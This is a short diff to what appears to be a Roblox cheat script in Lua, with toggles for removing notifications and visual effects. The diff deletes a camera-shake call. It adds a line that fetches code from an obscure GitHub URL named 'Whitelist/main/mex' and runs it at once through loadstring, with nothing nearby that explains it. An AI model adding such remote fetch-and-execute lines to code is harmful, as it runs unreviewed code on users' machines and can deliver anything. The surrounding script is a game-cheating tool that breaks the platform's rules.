@@ -5234,9 +5234,6 @@ while wait(.1) do
 end
 end)
 
-local CamShake = require(game.ReplicatedStorage.Util.CameraShaker)
-CamShake:Stop()
-    
 
 Main:AddToggle("Remove Notifications Text",false,function(NamfonGay)
 _G.Remove_trct = NamfonGay
@@ -13447,7 +13444,7 @@ end)
 	end)
 
 _G.Remove_Effect = true
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/su0wdhfu0iwrut05jtri/Whitelist/main/mex"))()
 spawn(function()
     game:GetService('RunService').Stepped:Connect(function()
         if _G.Remove_Effect then
